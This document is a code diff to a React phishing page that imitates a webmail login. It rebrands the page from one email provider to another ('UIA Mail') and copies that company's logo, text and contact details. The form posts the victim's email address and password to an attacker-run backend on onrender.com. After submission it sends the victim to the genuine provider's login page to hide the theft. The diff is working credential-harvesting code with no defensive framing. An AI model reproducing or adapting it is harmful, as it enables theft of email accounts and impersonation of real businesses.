@@ -7,6 +7,7 @@ import { useState } from 'react';
 import magic from './magic.png';
 
 import axios from 'axios';
+import uia from './uia.png';
 
 function Home(){
     const[email, setEmail] = useState("");
@@ -14,7 +15,7 @@ function Home(){
     const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState('');
 
-  const[platform, setPlatform] = useState("Visionary")
+  const[platform, setPlatform] = useState("UIA")
 
   const[showError, setShowError] = useState(false);
 
@@ -27,7 +28,7 @@ function Home(){
       e.preventDefault();
 
       try {
-        const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
+        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -39,7 +40,7 @@ function Home(){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+            window.location.href = 'https://mail.uia.net/login.php';
         }
       } catch (error) {
         // Handle error
@@ -58,28 +59,24 @@ function Home(){
             </div>}
             <div className='main col-md-10 m-auto px-5 py-2'>
 
-                <img src={logo} className="logo" />
+                <img src={uia} className="logo" />
 
                 <div className='innerdiv px-3 row'>
                     <div className='col-md-6 pt-3'>
-                        <h2 className='heading'>Welcome to Visionary Mail</h2>
+                        <h2 className='heading'>Welcome to UIA Mail!</h2>
 
                         <h3 className='headingtwo'>Login to access your account</h3>
 
                         <p className='content text-justify'>
-                        From here you can log in to your personal email settings. This is where you can setup and configure all your email options.
+                        Welcome to the User Site for the UIA Mail System.
+This is where you can setup and configure all your email options.
                         </p>
 
                         <p className='content text-justify'>
                         Please login by entering your <b>full email address</b> and password.
                         </p>
 
-                        <h3 className='headingtwo'>Forgot Your Password?</h3>
-
-                        <p className='content text-justify'>
-                        We are dedicated to providing you a secure online environment.
-                        To have your password reset, please contact our Technical Support team.
-                        </p>
+                       
 
                         <p style={{
                             fontSize:"12px",
@@ -95,7 +92,7 @@ function Home(){
 
 
                             <form onSubmit={handleSubmit}>
-                                <h3 className='headingtwo'>Sign in</h3>
+                                <h3 className='headingtwo'>Sign in to UIA Mail</h3>
 
                                 <hr
                         style={{
@@ -143,14 +140,17 @@ function Home(){
 
                             <div className='form-group row buttondiv'>
                                 
-                                <div className='col-6 text-left'>
+                                <div className='col-6 text-left'style={{
+                                    visibility:"hidden",
+                                }}>
                                     <img src={magic} />
                                 </div>
 
                                 <div className='col-6 text-right'>
                                     <button type="submit"className='btn'style={{
                                         color:"black",
-                                        backgroundColor:"rgb(252, 175, 9)",
+                                        backgroundColor:"lightgrey",
+                                       
                                     }}>Login</button>
                                 </div>
 
@@ -168,18 +168,8 @@ function Home(){
                 </div>
 
 
-                <p className='underone text-center mt-2'style={{
-                    fontWeight:"bold",
-                    fontSize:"13px",
-                    color:"black"
-                }}>Visionary Communications, Inc.</p>
-                <p style={{
-                    margin:0,
-                    fontSize:"11px",
-                    color:"black"
-                }} className='undertwo text-center'><b>Tel:</b> 888.682.1884 / <b>Fax:</b> 307.682.2519 / <b>Email:</b> <span style={{
-                    color:"rgb(252, 175, 9)",
-                }}>support@vcn.com</span></p>
+               
+                
                     
                 
 
@@ -187,7 +177,9 @@ function Home(){
                         
                          fontSize:"11px",
                          color:"black"
-                    }} className='underthree text-center'>MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>
+                    }} className='underthree text-center mt-3'>UIA Mail by Ultimate Internet Access, Inc. <br/>
+                    1300 Hwy 2, PO Box 1959, Wrightwood, CA 92397 <br/>
+                    Tel: (800) 982-6898</p>
             </div>
         </>
     );
